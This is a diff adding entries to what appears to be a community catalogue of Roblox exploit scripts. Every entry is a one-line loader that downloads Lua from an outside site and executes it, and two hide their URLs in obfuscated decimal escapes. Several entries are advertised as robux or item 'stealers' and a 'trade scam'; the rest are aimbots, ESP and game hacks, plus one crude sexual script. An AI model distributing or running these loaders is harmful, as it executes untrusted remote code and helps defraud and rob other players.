+      "Date": "December 15 2024",
+      "Description": "u can see all player and also npc",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubEsp\"))()",
+      "Script_Title": "esp pepole/npc",
+      "User_ID": 7051440186,
+      "Username": "ep2a1"
+    },
+    "Script2863": {
+      "Date": "December 15 2024",
+      "Description": ":D",
+      "Script": "_G.Aimbot = true\nloadstring(game:HttpGet(\"https://scripts.alchemyhub.xyz\"))()",
+      "Script_Title": "blox fruit aimbot v2",
+      "User_ID": 7057595357,
+      "Username": "ThaoNghivxke09767"
+    },
+    "Script2864": {
+      "Date": "December 15 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Scripterxzx/PLS-DONATE/refs/heads/main/PLS%20DONATE%20STEALER'))()",
+      "Script_Title": "PLS DONATE STEALER",
+      "User_ID": 1247813431,
+      "Username": "masonrobloxing"
+    },
+    "Script2865": {
+      "Date": "December 15 2024",
+      "Description": "reyb",
+      "Script": "loadstring(\"\\108\\111\\97\\100\\115\\116\\114\\105\\110\\103\\40\\103\\97\\109\\101\\58\\72\\116\\116\\112\\71\\101\\116\\40\\40\\39\\104\\116\\116\\112\\115\\58\\47\\47\\112\\97\\115\\116\\101\\102\\121\\46\\103\\97\\47\\84\\82\\52\\89\\105\\48\\88\\109\\47\\114\\97\\119\\39\\41\\44\\116\\114\\117\\101\\41\\41\\40\\41\\10\")()",
+      "Script_Title": "raro.",
+      "User_ID": 7530792782,
+      "Username": "darahudep"
+    },
+    "Script2866": {
+      "Date": "December 15 2024",
+      "Description": "Work",
+      "Script": "loadstring(game:HttpGet('https://darkscripts.space/scripts/cf27f931-b670-4767-b517-24d1896daaea_1174109127849549895.lua',true))()                              ",
+      "Script_Title": "Pls donate",
+      "User_ID": 40185128,
+      "Username": "rorobob110"
+    },
+    "Script2867": {
+      "Date": "December 15 2024",
+      "Description": "Only Work in pls donate vip is FE",
+      "Script": "loadstring(game:HttpGet('https://darkscripts.space/scripts/cd278479-95da-4820-ae61-caa9fba50f3d_1174109127849549895.lua',true))()                              ",
+      "Script_Title": "Pls Donate Free Vip",
+      "User_ID": 5474475295,
+      "Username": "Oskomaexe"
+    },
+    "Script2868": {
+      "Date": "December 15 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/realredz/BloxFruits/refs/heads/main/Source.lua\"))()",
+      "Script_Title": "redz",
+      "User_ID": 7643506870,
+      "Username": "Chorapragramatica"
+    },
+    "Script2869": {
+      "Date": "December 15 2024",
+      "Description": "it the best pls donate script",
+      "Script": "\nloadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/refs/heads/main/b8f0bd2293cb151c74ef0597.lua'))()",
+      "Script_Title": "pls donate ",
+      "User_ID": 7345018745,
+      "Username": "villian_JJ"
+    },
+    "Script2870": {
+      "Date": "December 16 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua\", true))()",
+      "Script_Title": "BF Update 24",
+      "User_ID": 7446951003,
+      "Username": "AlfanR5"
+    },
+    "Script2871": {
+      "Date": "December 16 2024",
+      "Description": "Best Trade Scam Very Op",
+      "Script": "loadstring(game:HttpGet('https://darkscripts.space/scripts/568b0907-1856-48ca-98d6-5ac0698f679a_1174109127849549895.lua',true))()                              ",
+      "Script_Title": "MM2 Trade Scam",
+      "User_ID": 5474475295,
+      "Username": "Oskomaexe"
+    },
+    "Script2872": {
+      "Date": "December 15 2024",
+      "Description": "super ring",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-Super-Ring-Parts-v3-by-Yumm-20047\"))()\n",
+      "Script_Title": "SUPER RING",
+      "User_ID": 5536084696,
+      "Username": "pou_pou784"
+    },
+    "Script2873": {
+      "Date": "December 16 2024",
+      "Description": "Script finds richest player on pls donate",
+      "Script": "loadstring(game:HttpGet('https://darkscripts.space/scripts/b81744e4-ef7f-4093-9fcf-c6536c4b53ec_1174109127849549895.lua',true))()                              ",
+      "Script_Title": "Pls Donate Find Rich",
+      "User_ID": 1302544728,
+      "Username": "tigerDan910"
+    },
+    "Script2874": {
+      "Date": "December 15 2024",
+      "Description": ":D",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-rochips-usefull-24163\"))()",
+      "Script_Title": "brookhaven",
+      "User_ID": 7057595357,
+      "Username": "ThaoNghivxke09767"
+    },
+    "Script2875": {
+      "Date": "December 16 2024",
+      "Description": "Steal robux",
+      "Script": "loadstring(game:HttpGet('https://darkscripts.space/scripts/b81744e4-ef7f-4093-9fcf-c6536c4b53ec_1174109127849549895.lua',true))()                              ",
+      "Script_Title": "Pls Donate Stealer",
+      "User_ID": 1302544728,
+      "Username": "tigerDan910"
+    },
+    "Script2876": {
+      "Date": "December 15 2024",
+      "Description": "Use strongest hero",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Kenjihin69/Kenjihin69/refs/heads/main/Tp%20exploit%20saitama%20to%20jun'))()",
+      "Script_Title": "Tsb jun",
+      "User_ID": 7472071232,
+      "Username": "Nethlogicdubmy"
+    },
+    "Script2877": {
+      "Date": "December 15 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua\", true))()",
+      "Script_Title": "blox fruits update\n",
+      "User_ID": 4600458627,
+      "Username": "Ax7_bielzin09"
+    },
+    "Script2878": {
+      "Date": "December 16 2024",
+      "Description": "سكربت هاذا لسه لازم يطور",
+      "Script": "loadstring(game:HttpGet(\"https://pastebin.com/raw/Lq04mZEb\"))()",
+      "Script_Title": "t00kill",
+      "User_ID": 7666453708,
+      "Username": "6X6X6_here"
+    },
+    "Script2879": {
+      "Date": "December 16 2024",
+      "Description": "this script new in bloxfruits speed has so op plss use this and thank you😜😜",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua\", true))()",
+      "Script_Title": "speed hub",
+      "User_ID": 4203899533,
+      "Username": "mhecogood"
+    },
+    "Script2880": {
+      "Date": "December 15 2024",
+      "Description": "jerk off",
+      "Script": "getgenv().JERK_OFF_SPEED = 2\n --// self explainatory, the speed of jerking off\ngetgenv().KEEP_ON_DEATH = true --// if true, gives you the jerk off tool when you respawn\n\nloadstring(game:HttpGet(\"https://raw.githubusercontent.com/Sakupenny/Universal-Jerk-Off/refs/heads/main/Main.lua\"))()",
+      "Script_Title": "jerk off",
+      "User_ID": 7654673534,
+      "Username": "7upaichul01998"
+    },
+    "Script2881": {
+      "Date": "December 15 2024",
+      "Description": "melhor do mundo ",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/AstroXTeam/AstroXTeam/refs/heads/main/%D9%87%D9%84%D9%88.lua\"))({ \"https://t.me/+tuhsBmhYBT0wMzBi\",true,\"BY:nxDredd\" })",
+      "Script_Title": "HACK RRgg",
+      "User_ID": 1160607583,
+      "Username": "barchoau"
+    },
+    "Script2882": {
+      "Date": "December 16 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/realredz/BloxFruits/refs/heads/main/Source.lua\"))()",
+      "Script_Title": "redz hub new",
+      "User_ID": 6034167843,
+      "Username": "DockDealer"
+    },
+    "Script2883": {
+      "Date": "December 16 2024",
+      "Description": "",
+      "Script": "\nloadstring(game:HttpGet(\"https://raw.githubusercontent.com/LuaCrack/Min/refs/heads/main/MinSeHub\"))()",
+      "Script_Title": "min hub",
+      "User_ID": 6034167843,
+      "Username": "DockDealer"
+    },
+    "Script2884": {
+      "Date": "December 15 2024",
+      "Description": "xd",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/ORG-hubb/ORG/main/ORG-Hub.lua\"))()",
+      "Script_Title": "loadstring(game:Http",
+      "User_ID": 3603500265,
+      "Username": "yukine8657"
+    },
+    "Script2885": {
+      "Date": "December 16 2024",
+      "Description": "speed hub keyless",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua\"))()",
+      "Script_Title": "bloxfruit dragon upd",
+      "User_ID": 2212059844,
+      "Username": "clint_icayan"
+    },
+    "Script2886": {
+      "Date": "December 16 2024",
+      "Description": "هاذا سكربت لي اخي العزيز",
+      "Script": "loadstring(game:HttpGet(\"https://pastebin.com/raw/zzjcr8FM\"))()",
+      "Script_Title": "pony hub",
+      "User_ID": 7666453708,
+      "Username": "6X6X6_here"
+    },
+    "Script2887": {
+      "Date": "December 16 2024",
+      "Description": "for arab",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/n0kc/AtomicHub/main/Map-Al-Biout.lua\"))()",
+      "Script_Title": "arab+sus",
+      "User_ID": 7503144841,
+      "Username": "4lilx_401"
+    },
+    "Script2888": {
+      "Date": "December 16 2024",
+      "Description": "gg",
+      "Script": "loadstring(game:HttpGet(\"\\104\\116\\116\\112\\115\\58\\47\\47\\114\\97\\119\\46\\103\\105\\116\\104\\117\\98\\117\\115\\101\\114\\99\\111\\110\\116\\101\\110\\116\\46\\99\\111\\109\\47\\110\\97\\105\\110\\115\\104\\117\\47\\110\\111\\47\\109\\97\\105\\110\\47\\65\\80\\84\\46\\108\\117\\97\"))()",
+      "Script_Title": "apt",
+      "User_ID": 7617784167,
+      "Username": "qazplm5596123"
+    },
+    "Script2889": {
+      "Date": "December 16 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://pastebin.com/raw/aaBxGfe7\"))()",
+      "Script_Title": "Blue Lock Rivals",
+      "User_ID": 7554158359,
+      "Username": "icaro_ttf"
+    },
+    "Script2890": {
+      "Date": "December 16 2024",
+      "Description": "Here use|Noclip not work sadly.SORRY THERES NO HIDE UI BUTTON.Maybe already Fixed",
+      "Script": "loadstring(game:GetObjects(\"rbxassetid://4001118261\")[1].Source)()",
+      "Script_Title": "Mm2b0ssjkl0666MyGui",
+      "User_ID": 4321575771,
+      "Username": "shewithepanda"
+    },
+    "Script2891": {
+      "Date": "December 16 2024",
+      "Description": "Here use my script make sure follow me in robloxName:shewithepandaThis is#2Script😊",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Doggo-cryto/EclipseMM2/master/Script\", true))()",
+      "Script_Title": "Mm2UseJkl0MyGui#2",
+      "User_ID": 4321575771,
+      "Username": "shewithepanda"
+    },
+    "Script2892": {
+      "Date": "December 16 2024",
+      "Description": "Better version",
+      "Script": "loadstring(game:HttpGet('https://darkscripts.space/scripts/b81744e4-ef7f-4093-9fcf-c6536c4b53ec_1174109127849549895.lua',true))()                              ",
+      "Script_Title": "Pls Donate Stealer",
+      "User_ID": 1302544728,
+      "Username": "tigerDan910"
+    },
+    "Script2893": {
+      "Date": "December 16 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet('https://darkscripts.space/scripts/b81744e4-ef7f-4093-9fcf-c6536c4b53ec_1174109127849549895.lua',true))()                                                         ",
+      "Script_Title": "PLS DONATE OP GUI",
+      "User_ID": 5285277741,
+      "Username": "ROROGOPNIK"
+    },
+    "Script2894": {
+      "Date": "December 16 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet('https://darkscripts.space/scripts/f27b715c-5aa5-4209-8c75-bbb960a4e4da_1174109127849549895.lua',true))()                              ",
+      "Script_Title": "PS99 Stealer",
+      "User_ID": 5285277741,
+      "Username": "ROROGOPNIK"
+    },
+    "Script2895": {
+      "Date": "December 16 2024",
+      "Description": "Here By: b0ssjkl0666 Its my gift for you! THIS IS TYCOON GAMES SCRIPT MAYBE WORKING 🙏",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/MadbukScripts/Scripts/main/Obfuscated%20Tycoon%20RNG.lua\"))()",
+      "Script_Title": "Tycoon By:b0ssjkl066",
+      "User_ID": 4321575771,
+      "Username": "shewithepanda"
+    }
